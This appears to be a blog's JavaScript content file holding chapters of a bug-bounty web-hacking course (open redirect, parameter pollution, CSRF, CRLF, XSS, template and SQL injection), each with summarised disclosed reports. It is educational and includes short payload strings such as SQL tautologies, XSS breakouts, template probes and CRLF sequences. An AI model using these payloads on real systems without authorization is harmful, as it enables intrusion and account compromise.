HTTP is stateless, meaning each request is treated independently, with the server unaware of any prior interactions. This would force users to repeatedly reenter credentials and resend all necessary data for every request. To maintain continuity, websites use cookies or basic authentication to remember users and streamline communication across multiple requests.

[+] Note: 
The specifics of how content is encoded using base64 are beyond the scope of this book, but you’ll likely encounter base64-encoded content while you’re hacking. If so, you should always decode that content. A Google search for “base64 decode” should provide plenty of tools and methods for doing this.

## Summary 
You now have a basic understanding of how the internet works: entering a website triggers the browser to resolve the domain to an IP address and send an HTTP request to the server. You learned how browsers structure requests, render responses, and use HTTP methods to communicate with servers. Additionally, you saw that vulnerabilities arise when unintended actions or unauthorized access occur, and bug bounties reward ethical discovery and reporting of these issues.

[+] See you in next chapter! 
    `
  },
  {
    id: 102,
    title: "Chapter 02: Open Redirect Vulnerability",
    excerpt: "Open redirects exploit the trust of a given domain to lure targets to a malicious website...",
    date: "2024-02-25",
    readTime: "10 min read",
    author: "Hacker00x1",
    image: "/blog-images/Open Redirect.png",
    content: `
## Introduction
We’ll begin our discussion with open redirect vulnerabilities, which occur when a target visits a website and that website sends their browser to a different URL, potentially on a separate domain. Open redirects exploit the trust of a given domain to lure targets to a malicious website.

## How Open Redirects Work
Open redirects happen when a website trusts user‑controlled input (like URL parameters, meta refresh tags, or JavaScript window.location) to send users to another page without proper validation. Attackers can change redirect parameters (such as redirect=, url=, or next=) to point to malicious sites, causing browsers to follow HTTP redirect responses (like 301 or 302) to harmful destinations. These vulnerabilities may appear in server‑side redirects, HTML meta tags, or client‑side JavaScript, and bug hunters typically find them by watching proxy traffic for GET requests that include user‑supplied redirect URLs.

## Shopify Theme Install Open Redirect
[-] Difficulty: Low 
[-] URL: https://apps.shopify.com/services/google/themes/preview/supply-blue?domain=
[-] Source: #
[-] Date reported: November 25, 2015 Bounty paid: $500

This Shopify open redirect happened because the domain_name parameter in a theme preview URL wasn’t properly validated. Shopify expected it to contain only legitimate store domains and automatically redirected users to that domain with /admin added. However, attackers could replace the value with their own malicious domain, causing victims to be redirected to an attacker‑controlled site (like attacker.com/admin). Once redirected, attackers could attempt phishing or other follow‑up attacks, making it a classic example of an unvalidated redirect vulnerability.

[+] Takeaways
Not all vulnerabilities are complex. For this open redirect, simply changing the domain_name parameter to an external site would redirect the user offsite from Shopify.

## Shopify Login Open Redirect
[-] Difficulty: Low
[-] URL: http://mystore.myshopify.com/account/login/
[-] Source: #
[-] Date reported: December 6, 2015 Bounty paid: $500

In this Shopify open redirect, the checkout_url parameter was supposed to send users to pages within a Shopify store by appending its value to a Shopify subdomain. However, attackers could manipulate the parameter by adding special characters (like a leading dot), creating URLs such as mystore.myshopify.com.attacker.com. Because DNS resolves domains from right to left, the browser would treat attacker.com as the real domain and redirect users there instead of staying on Shopify. This allowed attackers to trick users into leaving Shopify’s site and landing on a malicious domain despite the redirect appearing legitimate.

[+] Takeaways
If you can control only part of a redirect URL, special characters like . or @ can sometimes change how the browser interprets the final destination. When your input is appended to a fixed domain, these characters may cause the browser to treat another domain as the real target, exposing an open‑redirect vulnerability if the site doesn’t properly validate the URL.

## Platform Interstitial Redirect
[-] Difficulty: Low
[-] URL: N/A
[-] Source: #
[-] Date reported: January 20, 2016 Bounty paid: $500

Some sites use interstitial pages to warn users before leaving a trusted domain, helping prevent open‑redirect abuse. The platform trusted certain internal‑looking links, including ones involving Zendesk, so attackers could chain redirects through a custom Zendesk account without triggering a warning page. Researcher Mahmoud Jamal exploited this by adding JavaScript that forced a redirect to a malicious site, allowing users to be silently sent off‑platform. The issue was fixed by treating those Zendesk links as external and showing interstitial warnings.

[+] Takeaways
When hunting bugs, pay attention to third‑party services a site uses because they can introduce new attack paths, especially when combined with existing functionality like redirects. Clearly explain the security impact in your reports to help reviewers understand the risk and speed up fixes. If a company disagrees with your finding, keep researching and try to demonstrate real impact — sometimes chaining vulnerabilities together can prove the issue more convincingly.

## Summary
Open redirects let attackers secretly send users to malicious sites by abusing trusted links. They’re often found in parameters like redirect_to=, checkout_url=, or even short names like r= or u=. Testing involves carefully analyzing parameters and trying special characters when parts of the URL are fixed.
Successful bug hunting also means understanding third‑party services a site uses, staying persistent, and clearly demonstrating real impact so companies recognize and accept the vulnerability.

[+] See you in next chapter!
`
  },
  {
    id: 103,
    title: "Chapter 03: HTTP Parameter Pollution",
    excerpt: "HTTP parameter pollution (HPP) is the process of manipulating how a website treats the parameters it receives during HTTP requests...",
    date: "2024-01-30",
    readTime: "8 min read",
    author: "Hacker00x1",
    image: "/blog-images/HTTP Parameter Pollution.png",
    content: `
## Introduction
HTTP parameter pollution (HPP) is the process of manipulating how a website treats the parameters it receives during HTTP requests. The vulnerability occurs when an attacker injects extra parameters into a request and the target website trusts them, leading to unexpected behavior. HTTP bugs can happen on the server side

## Server- Side HPP
Server‑side HTTP Parameter Pollution (HPP) happens when attackers send duplicate or unexpected parameters to manipulate how backend code processes requests. Since server logic is hidden, testers must experiment with parameters to see how the server handles duplicates (first value, last value, or all). For example, adding extra parameters like from=ABCDEF in a bank transfer request could trick the server into using an attacker‑controlled account instead of the legitimate one, especially when backend code relies on parameter order or assumptions about input structure.

## Client- Side HPP
Client‑side HTTP Parameter Pollution (HPP) happens when attackers inject encoded characters (like %26, which becomes &) into parameters so extra values are added when the browser builds new URLs. Even if the server encodes input for safety, the browser may still interpret the injected value as a new parameter-like turning par=123%26action=edit into a link containing an extra action=edit. This can change client‑side behavior and potentially create vulnerabilities depending on how the application processes the modified URL.

## Social Sharing Buttons
[-] Difficulty: Low 
[-] URL: #
[-] Source: #
[-] Date reported: December 18, 2015 Bounty paid: $500

HPP vulnerabilities can appear in links that interact with other services, like social media share buttons. On some platforms, attackers could append extra parameters to a blog URL - such as &u=https://vk.com/durov-which would override the original URL in the generated Facebook share link, redirecting users to a different site. Similarly, adding &text= could alter the default tweet text. These examples show how parameter tampering can manipulate client‑side behavior and external services.

[+] Takeaways
Watch for vulnerabilities when sites accept user content, interact with other services, or use the current URL to generate output. In such cases, parameters may be passed along without proper validation, creating opportunities for HTTP Parameter Pollution (HPP) attacks.

## Twitter Unsubscribe Notifications
[-] Difficulty: Low 
[-] URL: https://www.twitter.com/ 
[-] Source: https://blog.mert.ninja/twitter-hpp-vulnerability/ 
[-] Date reported: August 23, 2015 Bounty paid: $700

This Twitter bug showed how persistence can uncover HPP issues. The unsubscribe link used a UID and a SIG signature to prevent tampering. Changing the UID alone failed because the signature no longer matched. But by adding a second UID parameter, the system validated the signature using the first UID while performing the unsubscribe action using the second one - allowing attackers to unsubscribe other users from notifications. It's a great example of how duplicate parameters can bypass security checks when different parts of the backend process inputs differently.

[+] Takeaways
Tasci's example shows that persistence and knowledge of HPP pay off. Parameters like auto‑incremented UIDs are worth testing, as manipulating them can make applications behave unexpectedly and reveal vulnerabilities.

## Twitter Web Intents
[-] Difficulty: Low 
[-] URL: https://twitter.com/ 
[-] Source: https://ericrafaloff.com/parameter-tampering-attack-on-twitter-web-intents/ 
[-] Date reported: November 2015 Bounty paid: Undisclosed

Eric Rafaloff discovered HPP vulnerabilities in Twitter's intent URLs for following, liking, retweeting, and tweeting. By adding duplicate or unexpected parameters - like a second screen_name-he could make a user appear to interact with the intended account (e.g., follow or like) while actually performing the action on a different account. For example, a follow URL with two screen_name values would show Twitter's official profile but follow Rafaloff's test account, demonstrating how parameter order can be abused to manipulate client actions.

[+] Takeaways
The Twitter Web Intents bug showed that when one HPP vulnerability exists, similar issues may appear across the platform. Finding a flaw like this can signal a broader design problem, so it's smart to test related features and endpoints to see whether the same parameter‑handling weakness can be exploited elsewhere.

## Summary
The impact of HPP depends on how the backend uses polluted parameters, and since server code is hidden, finding these bugs takes careful trial‑and‑error testing. Researchers often start with areas like social media sharing features or any functionality that relies on URL parameters - especially IDs or similar values - while watching for unexpected behavior that reveals how the application processes duplicate or manipulated inputs.

[+] See you in next chapter!
`
  },
  {
    id: 104,
    title: "Chapter 04: Cross-Site Request Forgery",
    excerpt: "CSRF attack occurs when an attacker can make a tar get’s browser send an HTTP request to another website...",
    date: "2023-12-18",
    readTime: "7 min read",
    author: "Hacker00x1",
    image: "/blog-images/CSRF.png",
    content: `
## Introduction
A cross-site request forgery (CSRF) attack occurs when an attacker can make a tar get’s browser send an HTTP request to another website. That website then performs an action as though the request were valid and sent by the target. Such an attack typically relies on the target being previously authenticated on the vulnerable website where the action is submitted and occurs without the target’s knowledge.

## Authentication
CSRF attacks exploit how websites remember logged-in users through authentication methods like cookies or basic authorization. After a user logs in, the site stores session data in the browser so requests can be automatically authenticated without repeated logins. Cookies contain identifiers and attributes (such as secure, httponly, expires, and domain) that control how they’re sent and protected. If a user stays logged in and visits a malicious site, that site can trick the browser into sending authenticated requests , along with stored cookies, to another trusted site, potentially performing actions without the user’s knowledge.

## CSRF with GET Requests
In a CSRF attack using GET requests, a malicious website can trick a logged-in user’s browser into sending unauthorized actions, like transferring money, by embedding a hidden request inside an HTML element such as an <img> tag. When the browser loads the image, it automatically sends a GET request to the target site along with the user’s authentication cookies, allowing the action to execute without the user’s awareness. Because of this risk, developers should never use GET requests for actions that modify data and should rely on POST requests with proper CSRF protections instead.

## CSRF with POST Requests
When a site uses POST requests, attackers can’t rely on <img> tags, so they often use hidden forms that automatically submit in the background to perform actions like money transfers without the user noticing. The browser sends the victim’s cookies with the request, making it appear legitimate. However, protections such as CSRF tokens, preflight OPTIONS checks, and CORS rules can block these attacks, especially for application/json requests. Still, weak configurations or changing the content type to simple formats like x-www-form-urlencoded or text/plain may bypass protections if developers don’t secure the application properly.

## Defenses Against CSRF Attacks
Websites defend against CSRF mainly by using CSRF tokens, which are unique, unguessable values tied to a user’s session and included in sensitive requests so the server can verify they came from the legitimate site. Other protections include CORS policies, though misconfigurations or simple content types can sometimes bypass them. Additional defenses involve checking Origin/Referer headers to confirm request sources and using SameSite cookies, which limit when browsers send authentication cookies, helping prevent unauthorized cross-site requests from being executed.

## Platform Twitter Disconnect
[-] Difficulty: Low
[-] URL: https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect/
[-] Source: #
[-]] Date reported: January 17, 2016 Bounty paid: $500

When hunting for CSRF bugs, watch for GET requests that change server data, since GET should only retrieve information. In the Shopify example, disconnecting a Twitter account was done through a simple GET request without proper validation, making it vulnerable. An attacker could embed the URL in an <img> tag so that when a logged-in user visited a malicious page, their browser automatically sent the request and disconnected the account. Tools like Burp Suite or OWASP ZAP can help identify these risky requests during testing.

[+] Takeaways
Look for GET requests that change server data, since GET should only retrieve information. If actions like disconnecting accounts use GET without validation, they can be abused in CSRF attacks. Tools like Burp Suite or OWASP ZAP help you monitor requests and find these vulnerabilities.

## Change Delivery Zones
[-] Difficulty: Low
[-] URL: https://admin.instacart.com/api/v2/zones/
[-] Source: #
[-] Date reported: August 9, 2015 Bounty paid: $100

When testing for CSRF, don’t just check web pages — API endpoints can be vulnerable too. In the Instacart case, a hacker used a hidden HTML form to send a POST request that silently changed a user’s delivery zone. By auto-submitting the form (for example with a hidden iframe), attackers could execute the action with little or no user interaction, making the exploit more effective.

[+] Takeaways
When hunting for vulnerabilities, don’t limit yourself to web pages, API endpoints are often overlooked and can be exploitable. Developers sometimes assume APIs are hidden, but attackers can discover them by monitoring traffic from websites or mobile apps using tools like Burp Suite or OWASP ZAP.

## Account Takeover
[-] Difficulty: Medium
[-] URL: https://www.badoo.com/
[-] Source: #
[-] Date reported: April 1, 2016 Bounty paid: $852

A hacker discovered that Badoo exposed users’ CSRF token (rt) inside a publicly accessible JavaScript file. Because browsers allow external scripts to be loaded without CORS restrictions, an attacker could trick victims into visiting a malicious page that loaded this script, extracted the token, and used it to send authenticated requests. By crafting a request that linked the attacker’s Google account to the victim’s Badoo account, the attacker could perform account takeover actions, showing how improperly exposed tokens can defeat CSRF protections.

[+] Takeaways
Jamal noticed the rt CSRF token appearing in multiple responses and suspected it might be exposed somewhere accessible. By digging deeper, he found it leaked in a JavaScript file. The key lesson is to investigate anything unusual, like short tokens in URLs, and use tools such as Burp Suite to search traffic for sensitive data leaks.

[+] Summary
CSRF attacks let attackers perform actions on behalf of users without their knowledge. While many frameworks protect POST requests, GET requests that modify user data are often overlooked, so test them carefully. Also try altering or removing CSRF tokens in requests to check whether the server properly validates them.

[+] See you in next chapter!
`
  },
  {
    id: 105,
    title: "Chapter 05: HTML Injection and Content Spoofing",
    excerpt: "HTML injection and content spoofing are attacks that allow a malicious user to inject content into a site's web pages...",
    date: "2023-11-11",
    readTime: "4 min read",
    author: "Hacker00x1",
    image: "/blog-images/HTML Injection.png",
    content: `
## Introduction
Hypertext Markup Language (HTML) injection and content spoofing are attacks that allow a malicious user to inject content into a site's web pages. The attacker can inject HTML elements of their own design, most commonly as a tag that mimics a legitimate login screen in order to trick targets into submitting sensitive information to a malicious site.

## Comment Injection Through Character Encoding
[-] Difficulty: Low 
[-] URL: https://coinbase.com/apps/ 
[-] Source: #
[-] Date reported: December 10, 2015 Bounty paid: $200

Some websites filter out HTML tags to prevent HTML injection, but attackers can bypass this by using HTML character entities. Reserved characters like < and > are normally encoded as &lt; and &gt; to avoid injection, but even unreserved characters can be encoded numerically (e.g., a as &#97;). In the reported Coinbase case, submitting plain HTML in a review was filtered out, but submitting the same content using HTML-encoded numbers allowed the site to decode and render the HTML, effectively bypassing the filter.

[+] Takeaways
When testing a site, try different inputs, including encoded text like %2F, since some sites decode it before rendering. Tools like CyberChef make encoding and decoding easy.

## Platform Unintended HTML Inclusion
[-] Difficulty: Medium 
[-] URL: #
[-] Source: #
[-] Date reported: January 13, 2016 Bounty paid: $500

This section explains how a misconfigured Markdown editor allowed a "hanging single quote" to be injected into generated HTML. Combined with another injection (like a malicious <meta> refresh tag), it could have let attackers exploit browser parsing to exfiltrate sensitive page data such as CSRF tokens. The risk existed because React's dangerouslySetInnerHTML was used, inserting trusted HTML directly into the DOM without escaping it. Although not fully exploited, the potential impact led to a $500 bounty and a fix.

[+] Takeaways
Knowing how browsers render HTML - like <meta> refresh behavior-can expose hidden attack surfaces and help you discover real vulnerabilities, even if some reports are only theoretical.

## Platform Unintended HTML Include Fix Bypass
[-] Difficulty: Medium 
[-] URL: #
[-] Source: #
[-] Date reported: January 26, 2016 Bounty paid: $500

After the platform fixed the earlier Markdown bug, the reporter tested the patch and found a new issue: by adding extra quotes and attributes inside Markdown link syntax, the parser generated unintended arbitrary HTML attributes. Even though it wasn't immediately exploitable, the ability to inject unescaped HTML proved risky, so the platform reverted the fix, patched it differently, and awarded a $500 bounty.

[+] Takeaways
Just because code is updated doesn't mean all vulnerabilities are fixed. Be sure to test changes, and be persistent. When a fix is deployed, it means there is new code, which could contain bugs.

## Content Spoofing
[-] Difficulty: Low 
[-] URL: https://withinsecurity.com/wp-login.php 
[-] Source: #
[-] Date reported: January 16, 2016 Bounty paid: $250

A hacker found that a WordPress login page on Within Security displayed the error URL parameter directly in the login error message and even decoded encoded text. By modifying this parameter, the attacker could inject a fake warning telling users their account was hacked and directing them to attacker‑controlled contact info. The issue existed because user‑controlled input was rendered on the page without proper validation.

[+] Takeaways
URL parameters reflected in page content can lead to phishing, HTML injection, or XSS. Some programs pay little or nothing for these issues since they often rely on user deception rather than direct exploits.


## Summary
HTML injection and content spoofing happen when a site reflects user input back into a page, letting attackers display fake messages or phishing content. Testing how input and URL parameters are rendered can help uncover these vulnerabilities.

[+] See you in next chapter! 
    `
  },
  {
    id: 106,
    title: "Chapter 06: Carriage Return Line Feed Injection",
    excerpt: "Some vulnerabilities allow users to input encoded characters that have special meanings in HTML and HTTP responses...",
    date: "2023-10-02",
    readTime: "5 min read",
    author: "Hacker00x1",
    image: "/blog-images/Feed Injection.png",
    content: `
## Introduction
Some vulnerabilities allow users to input encoded characters that have special meanings in HTML and HTTP responses. Normally, applications sanitize these characters when they are included in user input to pre vent attackers from maliciously manipulating HTTP messages, but in some cases, applications either forget to sanitize input or fail to do so properly.

## HTTP Request Smuggling
HTTP request smuggling happens when attackers abuse a CRLF injection flaw to sneak a second hidden HTTP request inside a legitimate one. Because some servers or proxies misinterpret where headers end, the malicious request can pass security checks and reach backend systems, leading to issues like cache poisoning, firewall bypass, request hijacking, or response splitting. In response splitting, attackers inject extra headers, sometimes even redirects or XSS payloads , causing browsers to process manipulated responses or send users to malicious pages.

## Shopify Response Splitting
[-] Difficulty: Medium
[-] URL: v.shopify.com/last_shop?.myshopify.com
[-] Source: #
[-] Date reported: December 22, 2015 Bounty paid: $500

In this Shopify case, a researcher discovered that the last_shop URL parameter wasn’t properly validated, allowing CRLF characters (%0d%0a) to be injected. Because Shopify used this unsanitized input to create HTTP response headers, an attacker could split the response and craft a second fake HTTP response containing malicious HTML. By manipulating headers like Content-Length and Content-Type, the browser interpreted the injected data as a new response and rendered attacker-controlled content, which could lead to defacement, redirects, or XSS attacks.

[+] Takeaways
Watch for user input reflected in HTTP response headers, especially when cookies are set — because it may allow CRLF injection. If input isn’t sanitized, attackers could manipulate headers or split responses, and GET requests make exploitation easier since they need little user interaction.

## Twitter Response Splitting
[-] Difficulty: High
[-] URL: https://twitter.com/i/safety/report_story/
[-] Source: #
[-] Date reported: March 15, 2015 Bounty paid: $3,500

This example shows how a researcher bypassed Twitter’s CRLF blacklist by using Unicode multibyte encoding to sneak hidden carriage return and line feed characters into HTTP responses. Even though Twitter filtered normal CRLF input, the encoded characters were decoded later, allowing response splitting and malicious header injection like Set-Cookie. The flaw was further chained into an XSS attack that could execute JavaScript and steal session cookies, proving how encoding tricks can defeat weak input filtering and lead to serious account compromise.

[+] Takeaways
If %0D%0A is filtered, test how the site sanitizes input. Techniques like double encoding or multibyte characters may bypass weak filters and still decode into CRLF values.


## Summary
CRLF flaws happen when a site reflects unsanitized %0D%0A into HTTP headers, letting attackers manipulate responses and potentially cause cache poisoning, firewall bypass, request hijacking, or response splitting. While testing, always inspect HTTP responses—especially headers—and if CRLF is filtered, try encoded or multibyte input to see how the site decodes it.


[+] See you in next chapter!
    `
  }
  ,
  {
    id: 107,
    title: "Chapter 07: Cross-­Site Scripting (XSS)",
    excerpt: "XSS happens when websites fail to properly escape characters like quotes or angle brackets...",
    date: "2023-09-12",
    readTime: "10 min read",
    author: "Hacker00x1",
    image: "/blog-images/Cross-Site Scripting.png",
    content: `
## Introduction
One of the most famous examples of a cross-site scripting (XSS) vulnerability is the Myspace Samy Worm created by Samy Kamkar. In October 2005, Kamkar exploited a vulnerability on Myspace that allowed him to store a JavaScript payload on his profile. proving how unsanitized input can execute malicious code in browsers.

XSS happens when websites fail to properly escape characters like quotes or angle brackets, allowing attackers to inject scripts that steal cookies, access user data, or perform actions on behalf of victims. The impact depends on context, browser protections like Same Origin Policy, and whether sensitive data is accessible. XSS can be triggered through HTML tags, attributes, or JavaScript variables, so confirming execution and real risk is key when reporting vulnerabilities.

## Types of XSS
XSS (Cross‑Site Scripting) mainly comes in reflected and stored forms. Reflected XSS happens when malicious input is sent in a request and immediately executed without being saved, while stored XSS occurs when the site saves harmful code and later displays it to other users. Subtypes include DOM‑based XSS (manipulating client‑side JavaScript like URL data), blind XSS (executed in areas attackers can’t see, such as admin panels), and self‑XSS (affects only the attacker and is usually low severity). The impact depends on where and how the script runs, but most XSS issues can be prevented by properly sanitizing and validating user input before rendering it.

## Shopify Wholesale XSS
[-] Difficulty: Low
[-] URL: wholesale.shopify.com/
[-] Source: #
[-] Date reported: December 21, 2015 Bounty paid: $500

XSS payloads must be crafted based on where the input is rendered, HTML or inside JavaScript. In a 2015 Shopify example, a search box reflected user input inside <script> tags without proper sanitization. HTML tags were encoded, so normal payloads like <script>alert('XSS')</script> failed. But by checking the page source, a hacker realized they could break out of a JavaScript string using input like test';alert('XSS');', which injected and executed malicious code. This shows that even when HTML is sanitized, unsafe handling inside JavaScript can still lead to XSS.

[+] Takeaways
XSS can come from simple unsanitized input fields. When testing, always check the page source to see if your input appears in HTML or JavaScript, since the payload must match its rendering context.

## Shopify Currency Formatting XSS
[-] Difficulty: Low
[-] URL: .myshopify.com/admin/settings/general/
[-] Source: #
[-] Report date: December 9, 2015 Bounty paid: $1,000

XSS payloads don’t always run right away, they may execute later when the data is displayed somewhere else. In a Shopify case, attackers injected a malicious payload into a currency settings field that looked harmless at first but later executed in the store’s social media sales page when admins viewed it. This shows why inputs must be sanitized everywhere they’re rendered, not just where they’re submitted.

[+] Takeaways
XSS payloads may not run immediately, so it’s important to check all locations where input is used. In this case, submitting the payload on the currency page didn’t trigger it, the reporter had to use another site feature to make it execute.

## Yahoo! Mail Stored XSS
[-] Difficulty: Medium
[-] URL: Yahoo! Mail
[-] Source: https://klikki.fi/adv/yahoo.html
[-] Date reported: December 26, 2015 Bounty paid: $10,000

Incorrect input sanitization can create new XSS risks. In a Yahoo! Mail case, the editor tried to remove dangerous JavaScript attributes from <img> tags but mishandled malformed HTML and Boolean attributes. This broke the tag structure, allowing an attacker to inject an onmouseover event that executed XSS when users moved their mouse over the page, showing that flawed filtering can introduce vulnerabilities instead of preventing them.

[+] Takeaways
If a site modifies input instead of properly encoding it, test edge cases and developer assumptions (like duplicate or malformed attributes). In this case, testing Boolean attributes with values revealed an XSS vulnerability.

## Google Image Search
[-] Difficulty: Medium
[-] URL: images.google.com/
[-] Source: https://mahmoudsec.blogspot.com/2015/09/how-i-found-xss -vulnerability-in-google.html
[-] Date reported: September 12, 2015 Bounty paid: Undisclosed

XSS doesn’t always need special characters, sometimes simple payloads like javascript:alert(1) work if user input controls link URLs. In a Google Images case, a researcher modified a URL parameter that became an <a href> value, allowing JavaScript execution in the page’s context. Although Google blocked mouse clicks, he bypassed it by using keyboard navigation, showing that alternative interactions can still trigger XSS.

[+] Takeaways
Watch for URL parameters reflected on pages, you control those values, and they can bypass filters, especially when rendered in places like link href attributes where special characters aren’t needed. Also, don’t assume big companies are bug‑free; even major sites like Google can still have undiscovered vulnerabilities.

## Google Tag Manager Stored XSS
[-] Difficulty: Medium
[-] URL: tagmanager.google.com/
[-] Source: https://blog.it-securityguard.com/bugbounty-the-5000-google-xss/
[-] Date reported: October 31, 2014 Bounty paid: $5,000

Best practice is to sanitize input when it’s rendered, not just when submitted, because new input methods (like file uploads) might bypass filters. In a Google Tag Manager case, form inputs were sanitized, but JSON file uploads weren’t. A researcher uploaded a malicious payload through JSON, and since it wasn’t sanitized at render time, it executed XSS, showing why consistent output sanitization is critical.

[+] Takeaways
Key lessons: always test all input methods (forms, uploads, APIs) because they may be processed differently, and don’t assume protections are applied everywhere. Also, sanitizing input only on submission is risky, proper security should happen at rendering time. Even big teams make mistakes, so always test despite common defenses.

## United Airlines XSS
[-] Difficulty: Hard
[-] URL: checkin.united.com/
[-] Source: http://strukt93.blogspot.jp/2016/07/united-to-xss-united.html
[-] Date reported: July 2016 Bounty paid: Undisclosed

A researcher found XSS on United Airlines by noticing a URL parameter reflected unsanitized in HTML. Even though United tried to block XSS by overriding functions like alert, the attackers analyzed the site’s JavaScript, found gaps (like the unprotected writeln function), and used payload tricks with URL fragments and iframes to bypass filters. The lesson: study client‑side defenses closely, custom protections often have weaknesses that can be bypassed with creative testing.

[+] Takeaways
Key takeaways: stay persistent and analyze why payloads fail instead of giving up; blacklists of JavaScript functions often signal weak defenses and potential XSS gaps; and solid JavaScript knowledge is crucial for understanding and exploiting more complex vulnerabilities.


## Summary
XSS is common and often easy to miss. Test inputs with payloads, but also examine how sites sanitize data, especially when they modify input or sanitize only on submission. Try all input methods, watch for reflected URL parameters, and consider whether input appears in HTML or JavaScript. Also remember that XSS may execute later in different parts of the site, not immediately.

[+] See you in next chapter!
    `
  },
  {
    id: 108,
    title: "Chapter 08: Template Injection Vulnerability",
    excerpt: "Template injection vulnerabilities occur when engines render user input without properly sanitizing it, sometimes leading to RCE...",
    date: "2023-08-25",
    readTime: "6 min read",
    author: "Hacker00x1",
    image: "/blog-images/Template Injection.png",
    content: `
## Introduction
A template engine is code that creates dynamic websites, emails, and other media by automatically filling in placeholders in the template when rendering it. By using placeholders, the template engine allows developers to separate application and business logic.

Template injection vulnerabilities occur when engines render user input without properly sanitizing it, sometimes leading to remote code execution. 

There are two types of template injection vulnerabilities: server side and client side.

## Server-Side Template Injections
Server‑Side Template Injection (SSTI) happens when user input is executed inside server templates, sometimes allowing file access or even remote code execution depending on the engine (like Jinja2, ERB, Smarty, Twig, Liquid). To test, identify the template engine (using tools like Wappalyzer or BuiltWith) and submit simple template expressions such as {{7*7}}. If the page renders 49, it means the template evaluated your input and may be vulnerable.

## Client-Side Template Injections
Client‑Side Template Injection (CSTI) happens in browser‑based template engines like AngularJS or ReactJS. It usually leads to XSS rather than remote code execution and often requires bypassing built‑in protections. For example, ReactJS is mostly safe unless functions like dangerouslySetInnerHTML are used, while older AngularJS versions had sandbox bypasses. Even if injections work (like {{4+4}} → 8), extra filters or limits can make exploitation ineffective.

## Uber AngularJS Template Injection
[-] Difficulty: High
[-] URL: https://developer.uber.com/
[-] Source: https://hackerone.com/reports/125027/
[-] Date reported: March 22, 2016 Bounty paid: $3,000

James Kettle found a CSTI bug on an Uber subdomain by injecting {{7*7}} into a URL and seeing it render as 49, proving AngularJS evaluated user input. Because the site used a vulnerable AngularJS version, he applied a Sandbox bypass to execute JavaScript (alert(1)), turning the CSTI into XSS. This showed how client‑side template injections can lead to serious risks like compromised developer accounts.

[+] Takeaways
Once you identify a client-side template engine, test it with simple payloads (e.g., {{7*7}} for AngularJS) and observe the output. If executed, check the AngularJS version via Angular.version. Versions above 1.6 don’t need a Sandbox bypass, but older versions require a version-specific bypass like Kettle’s to exploit XSS.

## Uber Flask Jinja2 Template Injection
[-] Difficulty: Medium
[-] URL: https://riders.uber.com/
[-] Source: https://hackerone.com/reports/125980/
[-] Date reported: March 25, 2016 Bounty paid: $10,000

Key lessons: always identify a company’s tech stack because it reveals possible attack paths. Orange Tsai used Uber’s “treasure map” to find Flask/Jinja2 services and tested SSTI with simple expressions like {{1+1}}, which executed in notification emails, confirming server‑side template evaluation. He responsibly stopped after proving code execution, showing it’s best to demonstrate impact without going too far unless the company gives permission.

[+] Takeaways
Identify the technologies a site uses and how they interact, hidden components (like Flask/Jinja2) can introduce vulnerabilities even if not visible on the main site. Test all places where input might appear, since payloads may look harmless in one location but execute in another, like emails or background processes.

## Rails Dynamic Render
[-] Difficulty: Medium
[-] URL: N/A
[-] Source: https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to -rce-cve-2016–0752/
[-] Date reported: February 1, 2015 Bounty paid: N/A

A Rails SSTI/RCE issue (CVE‑2016‑0752) showed how dangerous it is to pass user‑controlled parameters directly to the render method. Because Rails auto‑searched directories for templates, attackers could read sensitive files like /etc/passwd or execute ERB code (e.g., <%= \ls' %>). Although patched, the lesson remains: avoid rendering user input directly—especially with inline:' and always validate and restrict template paths.

[+] Takeaways
Knowing how a framework works (like Rails’ MVC design and rendering flow) helps you spot risky patterns. If user‑controlled input is tied directly to how templates or content are rendered, it can open serious vulnerabilities. So always watch for parameters that influence rendering logic, those are high‑value testing targets.

## Unikrn Smarty Template Injection
[-] Difficulty: Medium
[-] URL: N/A
[-] Source: https://hackerone.com/reports/164224/
[-] Date reported: August 29, 2016 Bounty paid: $400

During recon on Unikrn, the researcher noticed AngularJS and tested CSTI with {{7*7}}. An invite email revealed a Smarty template error, confirming server‑side template injection. By testing Smarty variables and {php} tags, they executed PHP code and proved remote code execution by reading /etc/passwd in chunks. The bug was reported and fixed quickly.

[+] Takeaways
A stack trace hinted at SSTI, proving something was wrong. The key lessons: follow red flags, read the technology’s documentation, and stay persistent when testing potential vulnerabilities.


#3 Summary
When hunting for vulnerabilities, first identify the technology in use, frameworks, template engines, or rendering tools, since this guides possible attack vectors. Pay attention to where your input is rendered, and remember that vulnerabilities might not appear immediately but could exist in other features, like emails or notifications.


[+] See you in next chapter! 
    `
  },
  {
    id: 109,
    title: "Chapter 09: SQL Injection Vulnerability",
    excerpt: "SQL Injectionallows an attacker to query or attack the site’s database using SQL (Structured Query Language)... ",
    date: "2023-07-14",
    readTime: "8 min read",
    author: "Hacker00x1",
    image: "/blog-images/SQL Injection.png",
    content: `
## Introduction
When a vulnerability on a database-backed site allows an attacker to query or attack the site’s database using SQL (Structured Query Language), it is known as a SQL injection (SQLi). Often, SQLi attacks are highly rewarded because they can be devastating: attackers can manipulate or extract information or even create an administrator login for themselves in the database.

## SQL Databases
SQL injection (SQLi) happens when user input is added to an SQL query without proper sanitization, allowing attackers to change the query’s logic. By injecting payloads like test' OR 1='1, an attacker can make conditions always true and retrieve all records from a database. Using ;--, they can even end the query and comment out security checks, such as password validation, to bypass authentication.

## Countermeasures Against SQLi
Prepared statements help prevent SQL injection by using query templates with placeholders instead of dynamically inserting user input into SQL commands. This ensures that even if a user provides malicious data, it cannot change the structure of the query. Modern web frameworks like Ruby on Rails and Django also include built-in protections against SQLi, but they are not foolproof—developer mistakes or poor practices can still introduce vulnerabilities. As a result, SQLi is more commonly found in older, custom-built websites or in applications where security best practices were not properly followed.

## Yahoo! Sports Blind SQLi
[-] Difficulty: Medium
[-] URL: https://sports.yahoo.com
[-] Source: N/A
[-] Date reported: February 16, 2014
[-] Bounty paid: $3,705

Blind SQL injection occurs when an attacker can inject SQL code but cannot see the direct output of the query. Instead, they infer information by observing differences in the application’s response to modified queries. In the Yahoo! example, adding -- to a URL parameter changed the results, revealing a vulnerability. The researcher then used Boolean conditions (true/false checks) to test database details, such as the MySQL version, based on whether the page returned results or not. Even without direct output, these response differences allowed him to confirm and extract information from the database.

[+] Takeaways
SQL injection can often be found by testing URL parameters and watching for changes in results. Small inputs like -- may alter the query’s behavior, revealing that user input is directly affecting the SQL statement.

## Uber Blind SQLi
[-] Difficulty: Medium
[-] URL: http://sctrack.email.uber.com.cn/track/unsubscribe.do/
[-] Source: https://hackerone.com/reports/150156/
[-] Date reported: July 8, 2016
